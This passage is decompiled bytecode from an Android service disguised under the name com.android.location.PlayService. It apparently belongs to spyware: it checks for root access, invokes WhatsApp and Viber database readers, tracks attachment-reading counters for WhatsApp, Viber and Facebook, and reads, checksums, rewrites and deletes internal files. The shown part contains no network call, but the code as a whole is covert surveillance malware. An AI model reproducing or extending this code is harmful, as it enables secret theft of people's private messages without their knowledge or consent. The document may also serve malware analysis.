    //   5396: aload 16
    //   5398: astore 15
    //   5400: aload 18
    //   5402: astore 13
    //   5404: iload_3
    //   5405: istore_2
    //   5406: aload 20
    //   5408: astore 10
    //   5410: aload 16
    //   5412: astore 14
    //   5414: aload 19
    //   5416: astore 12
    //   5418: aload_0
    //   5419: aload 16
    //   5421: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   5424: ifeq +3321 -> 8745
    //   5427: aload 17
    //   5429: astore 11
    //   5431: aload 16
    //   5433: astore 15
    //   5435: aload 18
    //   5437: astore 13
    //   5439: iload_3
    //   5440: istore_2
    //   5441: aload 20
    //   5443: astore 10
    //   5445: aload 16
    //   5447: astore 14
    //   5449: aload 19
    //   5451: astore 12
    //   5453: aload_0
    //   5454: sipush 128
    //   5457: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   5460: ifeq +3285 -> 8745
    //   5463: aload 17
    //   5465: astore 11
    //   5467: aload 16
    //   5469: astore 15
    //   5471: aload 18
    //   5473: astore 13
    //   5475: iload_3
    //   5476: istore_2
    //   5477: aload 20
    //   5479: astore 10
    //   5481: aload 16
    //   5483: astore 14
    //   5485: aload 19
    //   5487: astore 12
    //   5489: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   5492: getstatic 579	com/android/location/PlayService:CAN	B
    //   5495: if_icmpne +3250 -> 8745
    //   5498: aload 17
    //   5500: astore 11
    //   5502: aload 16
    //   5504: astore 15
    //   5506: aload 18
    //   5508: astore 13
    //   5510: iload_3
    //   5511: istore_2
    //   5512: aload 20
    //   5514: astore 10
    //   5516: aload 16
    //   5518: astore 14
    //   5520: aload 19
    //   5522: astore 12
    //   5524: aload_0
    //   5525: getfield 1045	com/android/location/PlayService:mWhatsAppReader	Lru/dtlbox/databasereader/WhatsAppReader;
    //   5528: ifnull +3217 -> 8745
    //   5531: aload 17
    //   5533: astore 11
    //   5535: aload 16
    //   5537: astore 15
    //   5539: aload 18
    //   5541: astore 13
    //   5543: iload_3
    //   5544: istore_2
    //   5545: aload 20
    //   5547: astore 10
    //   5549: aload 16
    //   5551: astore 14
    //   5553: aload 19
    //   5555: astore 12
    //   5557: new 864	java/lang/StringBuilder
    //   5560: dup
    //   5561: ldc_w 3589
    //   5564: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5567: getstatic 619	com/android/location/PlayService:lWAAttCounter	I
    //   5570: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5573: ldc_w 3591
    //   5576: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   5579: getstatic 681	com/android/location/PlayService:iPreventReadWAAtt	I
    //   5582: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5585: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5588: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5591: aload 17
    //   5593: astore 11
    //   5595: aload 16
    //   5597: astore 15
    //   5599: aload 18
    //   5601: astore 13
    //   5603: iload_3
    //   5604: istore_2
    //   5605: aload 20
    //   5607: astore 10
    //   5609: aload 16
    //   5611: astore 14
    //   5613: aload 19
    //   5615: astore 12
    //   5617: getstatic 681	com/android/location/PlayService:iPreventReadWAAtt	I
    //   5620: ifle +2828 -> 8448
    //   5623: aload 17
    //   5625: astore 11
    //   5627: aload 16
    //   5629: astore 15
    //   5631: aload 18
    //   5633: astore 13
    //   5635: iload_3
    //   5636: istore_2
    //   5637: aload 20
    //   5639: astore 10
    //   5641: aload 16
    //   5643: astore 14
    //   5645: aload 19
    //   5647: astore 12
    //   5649: getstatic 681	com/android/location/PlayService:iPreventReadWAAtt	I
    //   5652: iconst_1
    //   5653: isub
    //   5654: putstatic 681	com/android/location/PlayService:iPreventReadWAAtt	I
    //   5657: aload 17
    //   5659: astore 11
    //   5661: aload 16
    //   5663: astore 15
    //   5665: aload 18
    //   5667: astore 13
    //   5669: iload_3
    //   5670: istore_2
    //   5671: aload 20
    //   5673: astore 10
    //   5675: aload 16
    //   5677: astore 14
    //   5679: aload 19
    //   5681: astore 12
    //   5683: ldc_w 3593
    //   5686: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5689: aload 17
    //   5691: astore 11
    //   5693: aload 16
    //   5695: astore 15
    //   5697: aload 18
    //   5699: astore 13
    //   5701: iload_3
    //   5702: istore_2
    //   5703: aload 20
    //   5705: astore 10
    //   5707: aload 16
    //   5709: astore 14
    //   5711: aload 19
    //   5713: astore 12
    //   5715: aload_0
    //   5716: aload 16
    //   5718: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   5721: ifeq +3392 -> 9113
    //   5724: aload 17
    //   5726: astore 11
    //   5728: aload 16
    //   5730: astore 15
    //   5732: aload 18
    //   5734: astore 13
    //   5736: iload_3
    //   5737: istore_2
    //   5738: aload 20
    //   5740: astore 10
    //   5742: aload 16
    //   5744: astore 14
    //   5746: aload 19
    //   5748: astore 12
    //   5750: aload_0
    //   5751: sipush 256
    //   5754: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   5757: ifeq +3356 -> 9113
    //   5760: aload 17
    //   5762: astore 11
    //   5764: aload 16
    //   5766: astore 15
    //   5768: aload 18
    //   5770: astore 13
    //   5772: iload_3
    //   5773: istore_2
    //   5774: aload 20
    //   5776: astore 10
    //   5778: aload 16
    //   5780: astore 14
    //   5782: aload 19
    //   5784: astore 12
    //   5786: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   5789: getstatic 579	com/android/location/PlayService:CAN	B
    //   5792: if_icmpne +3321 -> 9113
    //   5795: aload 17
    //   5797: astore 11
    //   5799: aload 16
    //   5801: astore 15
    //   5803: aload 18
    //   5805: astore 13
    //   5807: iload_3
    //   5808: istore_2
    //   5809: aload 20
    //   5811: astore 10
    //   5813: aload 16
    //   5815: astore 14
    //   5817: aload 19
    //   5819: astore 12
    //   5821: aload_0
    //   5822: getfield 1043	com/android/location/PlayService:mViberReader	Lru/dtlbox/databasereader/ViberReader;
    //   5825: ifnull +3288 -> 9113
    //   5828: aload 17
    //   5830: astore 11
    //   5832: aload 16
    //   5834: astore 15
    //   5836: aload 18
    //   5838: astore 13
    //   5840: iload_3
    //   5841: istore_2
    //   5842: aload 20
    //   5844: astore 10
    //   5846: aload 16
    //   5848: astore 14
    //   5850: aload 19
    //   5852: astore 12
    //   5854: new 864	java/lang/StringBuilder
    //   5857: dup
    //   5858: ldc_w 3595
    //   5861: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5864: getstatic 615	com/android/location/PlayService:lViberAttCounter	I
    //   5867: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5870: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5873: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5876: aload 17
    //   5878: astore 11
    //   5880: aload 16
    //   5882: astore 15
    //   5884: aload 18
    //   5886: astore 13
    //   5888: iload_3
    //   5889: istore_2
    //   5890: aload 20
    //   5892: astore 10
    //   5894: aload 16
    //   5896: astore 14
    //   5898: aload 19
    //   5900: astore 12
    //   5902: getstatic 683	com/android/location/PlayService:iPreventReadViberAtt	I
    //   5905: ifle +2889 -> 8794
    //   5908: aload 17
    //   5910: astore 11
    //   5912: aload 16
    //   5914: astore 15
    //   5916: aload 18
    //   5918: astore 13
    //   5920: iload_3
    //   5921: istore_2
    //   5922: aload 20
    //   5924: astore 10
    //   5926: aload 16
    //   5928: astore 14
    //   5930: aload 19
    //   5932: astore 12
    //   5934: getstatic 683	com/android/location/PlayService:iPreventReadViberAtt	I
    //   5937: iconst_1
    //   5938: isub
    //   5939: putstatic 683	com/android/location/PlayService:iPreventReadViberAtt	I
    //   5942: iload_3
    //   5943: istore 4
    //   5945: aload 17
    //   5947: astore 11
    //   5949: aload 16
    //   5951: astore 15
    //   5953: aload 18
    //   5955: astore 13
    //   5957: iload 4
    //   5959: istore_2
    //   5960: aload 20
    //   5962: astore 10
    //   5964: aload 16
    //   5966: astore 14
    //   5968: aload 19
    //   5970: astore 12
    //   5972: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   5975: aload 17
    //   5977: astore 11
    //   5979: aload 16
    //   5981: astore 15
    //   5983: aload 18
    //   5985: astore 13
    //   5987: iload 4
    //   5989: istore_2
    //   5990: aload 20
    //   5992: astore 10
    //   5994: aload 16
    //   5996: astore 14
    //   5998: aload 19
    //   6000: astore 12
    //   6002: aload 16
    //   6004: invokevirtual 3596	java/io/FileOutputStream:flush	()V
    //   6007: aload 17
    //   6009: astore 11
    //   6011: aload 16
    //   6013: astore 15
    //   6015: aload 18
    //   6017: astore 13
    //   6019: iload 4
    //   6021: istore_2
    //   6022: aload 20
    //   6024: astore 10
    //   6026: aload 16
    //   6028: astore 14
    //   6030: aload 19
    //   6032: astore 12
    //   6034: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   6037: ldc_w 360
    //   6040: invokevirtual 2508	android/content/Context:openFileInput	(Ljava/lang/String;)Ljava/io/FileInputStream;
    //   6043: astore 17
    //   6045: aload 17
    //   6047: astore 11
    //   6049: aload 16
    //   6051: astore 15
    //   6053: aload 18
    //   6055: astore 13
    //   6057: iload 4
    //   6059: istore_2
    //   6060: aload 17
    //   6062: astore 10
    //   6064: aload 16
    //   6066: astore 14
    //   6068: aload 19
    //   6070: astore 12
    //   6072: new 864	java/lang/StringBuilder
    //   6075: dup
    //   6076: ldc_w 3598
    //   6079: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6082: aload 17
    //   6084: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   6087: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   6090: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6093: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6096: aload 17
    //   6098: astore 11
    //   6100: aload 16
    //   6102: astore 15
    //   6104: aload 18
    //   6106: astore 13
    //   6108: iload 4
    //   6110: istore_2
    //   6111: aload 17
    //   6113: astore 10
    //   6115: aload 16
    //   6117: astore 14
    //   6119: aload 19
    //   6121: astore 12
    //   6123: aload 17
    //   6125: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   6128: newarray byte
    //   6130: astore 21
    //   6132: aload 17
    //   6134: astore 11
    //   6136: aload 16
    //   6138: astore 15
    //   6140: aload 18
    //   6142: astore 13
    //   6144: iload 4
    //   6146: istore_2
    //   6147: aload 17
    //   6149: astore 10
    //   6151: aload 16
    //   6153: astore 14
    //   6155: aload 19
    //   6157: astore 12
    //   6159: aload 17
    //   6161: aload 21
    //   6163: iconst_0
    //   6164: aload 17
    //   6166: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   6169: invokevirtual 3602	java/io/FileInputStream:read	([BII)I
    //   6172: istore_3
    //   6173: aload 17
    //   6175: astore 11
    //   6177: aload 16
    //   6179: astore 15
    //   6181: aload 18
    //   6183: astore 13
    //   6185: iload 4
    //   6187: istore_2
    //   6188: aload 17
    //   6190: astore 10
    //   6192: aload 16
    //   6194: astore 14
    //   6196: aload 19
    //   6198: astore 12
    //   6200: new 864	java/lang/StringBuilder
    //   6203: dup
    //   6204: ldc_w 3604
    //   6207: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6210: iload_3
    //   6211: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   6214: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6217: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6220: aload 17
    //   6222: astore 11
    //   6224: aload 16
    //   6226: astore 15
    //   6228: aload 18
    //   6230: astore 13
    //   6232: iload 4
    //   6234: istore_2
    //   6235: aload 17
    //   6237: astore 10
    //   6239: aload 16
    //   6241: astore 14
    //   6243: aload 19
    //   6245: astore 12
    //   6247: aload_0
    //   6248: ldc_w 360
    //   6251: invokevirtual 3607	com/android/location/PlayService:deleteFile	(Ljava/lang/String;)Z
    //   6254: pop
    //   6255: aload 17
    //   6257: astore 11
    //   6259: aload 16
    //   6261: astore 15
    //   6263: aload 18
    //   6265: astore 13
    //   6267: iload 4
    //   6269: istore_2
    //   6270: aload 17
    //   6272: astore 10
    //   6274: aload 16
    //   6276: astore 14
    //   6278: aload 19
    //   6280: astore 12
    //   6282: new 3609	java/util/zip/CRC32
    //   6285: dup
    //   6286: invokespecial 3610	java/util/zip/CRC32:<init>	()V
    //   6289: astore 20
    //   6291: aload 17
    //   6293: astore 11
    //   6295: aload 16
    //   6297: astore 15
    //   6299: aload 18
    //   6301: astore 13
    //   6303: iload 4
    //   6305: istore_2
    //   6306: aload 17
    //   6308: astore 10
    //   6310: aload 16
    //   6312: astore 14
    //   6314: aload 19
    //   6316: astore 12
    //   6318: aload 20
    //   6320: aload 21
    //   6322: iconst_0
    //   6323: aload 21
    //   6325: arraylength
    //   6326: invokeinterface 3614 4 0
    //   6331: aload 17
    //   6333: astore 11
    //   6335: aload 16
    //   6337: astore 15
    //   6339: aload 18
    //   6341: astore 13
    //   6343: iload 4
    //   6345: istore_2
    //   6346: aload 17
    //   6348: astore 10
    //   6350: aload 16
    //   6352: astore 14
    //   6354: aload 19
    //   6356: astore 12
    //   6358: aload 20
    //   6360: invokeinterface 3617 1 0
    //   6365: ldc2_w 3618
    //   6368: land
    //   6369: l2i
    //   6370: istore_3
    //   6371: aload 17
    //   6373: astore 11
    //   6375: aload 16
    //   6377: astore 15
    //   6379: aload 18
    //   6381: astore 13
    //   6383: iload 4
    //   6385: istore_2
    //   6386: aload 17
    //   6388: astore 10
    //   6390: aload 16
    //   6392: astore 14
    //   6394: aload 19
    //   6396: astore 12
    //   6398: new 864	java/lang/StringBuilder
    //   6401: dup
    //   6402: ldc_w 3621
    //   6405: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6408: iload_3
    //   6409: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   6412: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6415: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6418: aload 17
    //   6420: astore 11
    //   6422: aload 16
    //   6424: astore 15
    //   6426: aload 18
    //   6428: astore 13
    //   6430: iload 4
    //   6432: istore_2
    //   6433: aload 17
    //   6435: astore 10
    //   6437: aload 16
    //   6439: astore 14
    //   6441: aload 19
    //   6443: astore 12
    //   6445: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   6448: aload_1
    //   6449: iconst_0
    //   6450: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   6453: astore_1
    //   6454: aload 17
    //   6456: astore 11
    //   6458: aload 16
    //   6460: astore 15
    //   6462: aload_1
    //   6463: astore 13
    //   6465: iload 4
    //   6467: istore_2
    //   6468: aload 17
    //   6470: astore 10
    //   6472: aload 16
    //   6474: astore 14
    //   6476: aload_1
    //   6477: astore 12
    //   6479: aload_1
    //   6480: aload 21
    //   6482: invokevirtual 1657	java/io/FileOutputStream:write	([B)V
    //   6485: aload 17
    //   6487: astore 11
    //   6489: aload 16
    //   6491: astore 15
    //   6493: aload_1
    //   6494: astore 13
    //   6496: iload 4
    //   6498: istore_2
    //   6499: aload 17
    //   6501: astore 10
    //   6503: aload 16
    //   6505: astore 14
    //   6507: aload_1
    //   6508: astore 12
    //   6510: iconst_4
    //   6511: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   6514: iload_3
    //   6515: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   6518: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   6521: astore 18
    //   6523: aload 17
    //   6525: astore 11
    //   6527: aload 16
    //   6529: astore 15
    //   6531: aload_1
    //   6532: astore 13
    //   6534: iload 4
    //   6536: istore_2
    //   6537: aload 17
    //   6539: astore 10
    //   6541: aload 16
    //   6543: astore 14
    //   6545: aload_1
    //   6546: astore 12
    //   6548: aload_0
    //   6549: aload 18
    //   6551: invokevirtual 3482	com/android/location/PlayService:Reverse4	([B)V
    //   6554: aload 17
    //   6556: astore 11
    //   6558: aload 16
    //   6560: astore 15
    //   6562: aload_1
    //   6563: astore 13
    //   6565: iload 4
    //   6567: istore_2
    //   6568: aload 17
    //   6570: astore 10
    //   6572: aload 16
    //   6574: astore 14
    //   6576: aload_1
    //   6577: astore 12
    //   6579: aload_1
    //   6580: aload 18
    //   6582: iconst_0
    //   6583: iconst_4
    //   6584: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   6587: aload 17
    //   6589: astore 11
    //   6591: aload 16
    //   6593: astore 15
    //   6595: aload_1
    //   6596: astore 13
    //   6598: iload 4
    //   6600: istore_2
    //   6601: aload 17
    //   6603: astore 10
    //   6605: aload 16
    //   6607: astore 14
    //   6609: aload_1
    //   6610: astore 12
    //   6612: aload 20
    //   6614: invokeinterface 3624 1 0
    //   6619: aload 16
    //   6621: ifnull +8 -> 6629
    //   6624: aload 16
    //   6626: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   6629: aload_1
    //   6630: ifnull +7 -> 6637
    //   6633: aload_1
    //   6634: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   6637: iload 4
    //   6639: istore_3
    //   6640: aload 17
    //   6642: ifnull +11 -> 6653
    //   6645: aload 17
    //   6647: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   6650: iload 4
    //   6652: istore_3
    //   6653: new 864	java/lang/StringBuilder
    //   6656: dup
    //   6657: ldc_w 3626
    //   6660: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6663: iload_3
    //   6664: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   6667: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6670: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6673: iload_3
    //   6674: ireturn
    //   6675: aload 21
    //   6677: iload_2
    //   6678: iconst_0
    //   6679: bastore
    //   6680: iload_2
    //   6681: iconst_1
    //   6682: iadd
    //   6683: istore_2
    //   6684: goto -6658 -> 26
    //   6687: aload 17
    //   6689: astore 11
    //   6691: aload 16
    //   6693: astore 15
    //   6695: aload 18
    //   6697: astore 13
    //   6699: iload 4
    //   6701: istore_2
    //   6702: aload 20
    //   6704: astore 10
    //   6706: aload 16
    //   6708: astore 14
    //   6710: aload 19
    //   6712: astore 12
    //   6714: aload 16
    //   6716: aload 21
    //   6718: iconst_0
    //   6719: bipush 16
    //   6721: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   6724: goto -6213 -> 511
    //   6727: astore_1
    //   6728: aload 11
    //   6730: astore 10
    //   6732: aload 15
    //   6734: astore 14
    //   6736: aload 13
    //   6738: astore 12
    //   6740: aload_1
    //   6741: ldc_w 3470
    //   6744: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   6747: aload 15
    //   6749: ifnull +8 -> 6757
    //   6752: aload 15
    //   6754: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   6757: aload 13
    //   6759: ifnull +8 -> 6767
    //   6762: aload 13
    //   6764: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   6767: iload_2
    //   6768: istore_3
    //   6769: aload 11
    //   6771: ifnull -118 -> 6653
    //   6774: aload 11
    //   6776: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   6779: iload_2
    //   6780: istore_3
    //   6781: goto -128 -> 6653
    //   6784: astore_1
    //   6785: iload_2
    //   6786: istore_3
    //   6787: goto -134 -> 6653
    //   6790: aload 17
    //   6792: astore 11
    //   6794: aload 16
    //   6796: astore 15
    //   6798: aload 18
    //   6800: astore 13
    //   6802: iload 4
    //   6804: istore_2
    //   6805: aload 20
    //   6807: astore 10
    //   6809: aload 16
    //   6811: astore 14
    //   6813: aload 19
    //   6815: astore 12
    //   6817: aload 22
    //   6819: arraylength
    //   6820: istore_3
    //   6821: goto -6171 -> 650
    //   6824: aload 17
    //   6826: astore 11
    //   6828: aload 16
    //   6830: astore 15
    //   6832: aload 18
    //   6834: astore 13
    //   6836: iload 4
    //   6838: istore_2
    //   6839: aload 20
    //   6841: astore 10
    //   6843: aload 16
    //   6845: astore 14
    //   6847: aload 19
    //   6849: astore 12
    //   6851: bipush 15
    //   6853: aload 22
    //   6855: arraylength
    //   6856: isub
    //   6857: istore_3
    //   6858: goto -6135 -> 723
    //   6861: aload 17
    //   6863: astore 11
    //   6865: aload 16
    //   6867: astore 15
    //   6869: aload 18
    //   6871: astore 13
    //   6873: iload 4
    //   6875: istore_2
    //   6876: aload 20
    //   6878: astore 10
    //   6880: aload 16
    //   6882: astore 14
    //   6884: aload 19
    //   6886: astore 12
    //   6888: aload 16
    //   6890: aload 21
    //   6892: iconst_0
    //   6893: bipush 15
    //   6895: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   6898: goto -6139 -> 759
    //   6901: astore_1
    //   6902: aload 14
    //   6904: ifnull +8 -> 6912
    //   6907: aload 14
    //   6909: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   6912: aload 12
    //   6914: ifnull +8 -> 6922
    //   6917: aload 12
    //   6919: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   6922: aload 10
    //   6924: ifnull +8 -> 6932
    //   6927: aload 10
    //   6929: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   6932: aload_1
    //   6933: athrow
    //   6934: aload 17
    //   6936: astore 11
    //   6938: aload 16
    //   6940: astore 15
    //   6942: aload 18
    //   6944: astore 13
    //   6946: iload 4
    //   6948: istore_2
    //   6949: aload 20
    //   6951: astore 10
    //   6953: aload 16
    //   6955: astore 14
    //   6957: aload 19
    //   6959: astore 12
    //   6961: aload 22
    //   6963: arraylength
    //   6964: istore_3
    //   6965: goto -6067 -> 898
    //   6968: aload 17
    //   6970: astore 11
    //   6972: aload 16
    //   6974: astore 15
    //   6976: aload 18
    //   6978: astore 13
    //   6980: iload 4
    //   6982: istore_2
    //   6983: aload 20
    //   6985: astore 10
    //   6987: aload 16
    //   6989: astore 14
    //   6991: aload 19
    //   6993: astore 12
    //   6995: bipush 17
    //   6997: aload 22
    //   6999: arraylength
    //   7000: isub
    //   7001: istore_3
    //   7002: goto -6031 -> 971
    //   7005: aload 17
    //   7007: astore 11
    //   7009: aload 16
    //   7011: astore 15
    //   7013: aload 18
    //   7015: astore 13
    //   7017: iload 4
    //   7019: istore_2
    //   7020: aload 20
    //   7022: astore 10
    //   7024: aload 16
    //   7026: astore 14
    //   7028: aload 19
    //   7030: astore 12
    //   7032: aload 16
    //   7034: aload 21
    //   7036: iconst_0
    //   7037: bipush 17
    //   7039: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   7042: goto -6035 -> 1007
    //   7045: aload 17
    //   7047: astore 11
    //   7049: aload 16
    //   7051: astore 15
    //   7053: aload 18
    //   7055: astore 13
    //   7057: iload 4
    //   7059: istore_2
    //   7060: aload 20
    //   7062: astore 10
    //   7064: aload 16
    //   7066: astore 14
    //   7068: aload 19
    //   7070: astore 12
    //   7072: new 864	java/lang/StringBuilder
    //   7075: dup
    //   7076: ldc_w 3628
    //   7079: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7082: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   7085: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7088: ldc_w 1262
    //   7091: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7094: aload_0
    //   7095: getfield 987	com/android/location/PlayService:bIsRootInstall	Z
    //   7098: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   7101: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7104: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7107: iload 5
    //   7109: istore_3
    //   7110: goto -5780 -> 1330
    //   7113: lload 7
    //   7115: lconst_0
    //   7116: lcmp
    //   7117: ifne +88 -> 7205
    //   7120: aload 17
    //   7122: astore 11
    //   7124: aload 16
    //   7126: astore 15
    //   7128: aload 18
    //   7130: astore 13
    //   7132: iload_3
    //   7133: istore_2
    //   7134: aload 20
    //   7136: astore 10
    //   7138: aload 16
    //   7140: astore 14
    //   7142: aload 19
    //   7144: astore 12
    //   7146: bipush 50
    //   7148: putstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   7151: aload 17
    //   7153: astore 11
    //   7155: aload 16
    //   7157: astore 15
    //   7159: aload 18
    //   7161: astore 13
    //   7163: iload_3
    //   7164: istore_2
    //   7165: aload 20
    //   7167: astore 10
    //   7169: aload 16
    //   7171: astore 14
    //   7173: aload 19
    //   7175: astore 12
    //   7177: new 864	java/lang/StringBuilder
    //   7180: dup
    //   7181: ldc_w 3630
    //   7184: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7187: getstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   7190: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7193: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7196: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7199: iload_3
    //   7200: istore 4
    //   7202: goto -4832 -> 2370
    //   7205: aload 17
    //   7207: astore 11
    //   7209: aload 16
    //   7211: astore 15
    //   7213: aload 18
    //   7215: astore 13
    //   7217: iload_3
    //   7218: istore_2
    //   7219: aload 20
    //   7221: astore 10
    //   7223: aload 16
    //   7225: astore 14
    //   7227: aload 19
    //   7229: astore 12
    //   7231: iconst_5
    //   7232: putstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   7235: goto -84 -> 7151
    //   7238: lload 7
    //   7240: lconst_0
    //   7241: lcmp
    //   7242: ifne +90 -> 7332
    //   7245: aload 17
    //   7247: astore 11
    //   7249: aload 16
    //   7251: astore 15
    //   7253: aload 18
    //   7255: astore 13
    //   7257: iload 4
    //   7259: istore_2
    //   7260: aload 20
    //   7262: astore 10
    //   7264: aload 16
    //   7266: astore 14
    //   7268: aload 19
    //   7270: astore 12
    //   7272: bipush 50
    //   7274: putstatic 689	com/android/location/PlayService:iPreventReadAgent	I
    //   7277: aload 17
    //   7279: astore 11
    //   7281: aload 16
    //   7283: astore 15
    //   7285: aload 18
    //   7287: astore 13
    //   7289: iload 4
    //   7291: istore_2
    //   7292: aload 20
    //   7294: astore 10
    //   7296: aload 16
    //   7298: astore 14
    //   7300: aload 19
    //   7302: astore 12
    //   7304: new 864	java/lang/StringBuilder
    //   7307: dup
    //   7308: ldc_w 3632
    //   7311: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7314: getstatic 689	com/android/location/PlayService:iPreventReadAgent	I
    //   7317: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7320: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7323: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7326: iload 4
    //   7328: istore_3
    //   7329: goto -4442 -> 2887
    //   7332: aload 17
    //   7334: astore 11
    //   7336: aload 16
    //   7338: astore 15
    //   7340: aload 18
    //   7342: astore 13
    //   7344: iload 4
    //   7346: istore_2
    //   7347: aload 20
    //   7349: astore 10
    //   7351: aload 16
    //   7353: astore 14
    //   7355: aload 19
    //   7357: astore 12
    //   7359: iconst_5
    //   7360: putstatic 689	com/android/location/PlayService:iPreventReadAgent	I
    //   7363: goto -86 -> 7277
    //   7366: lload 7
    //   7368: lconst_0
    //   7369: lcmp
    //   7370: ifne +88 -> 7458
    //   7373: aload 17
    //   7375: astore 11
    //   7377: aload 16
    //   7379: astore 15
    //   7381: aload 18
    //   7383: astore 13
    //   7385: iload_3
    //   7386: istore_2
    //   7387: aload 20
    //   7389: astore 10
    //   7391: aload 16
    //   7393: astore 14
    //   7395: aload 19
    //   7397: astore 12
    //   7399: bipush 50
    //   7401: putstatic 687	com/android/location/PlayService:iPreventReadFB	I
    //   7404: aload 17
    //   7406: astore 11
    //   7408: aload 16
    //   7410: astore 15
    //   7412: aload 18
    //   7414: astore 13
    //   7416: iload_3
    //   7417: istore_2
    //   7418: aload 20
    //   7420: astore 10
    //   7422: aload 16
    //   7424: astore 14
    //   7426: aload 19
    //   7428: astore 12
    //   7430: new 864	java/lang/StringBuilder
    //   7433: dup
    //   7434: ldc_w 3634
    //   7437: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7440: getstatic 687	com/android/location/PlayService:iPreventReadFB	I
    //   7443: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7446: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7449: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7452: iload_3
    //   7453: istore 4
    //   7455: goto -4062 -> 3393
    //   7458: aload 17
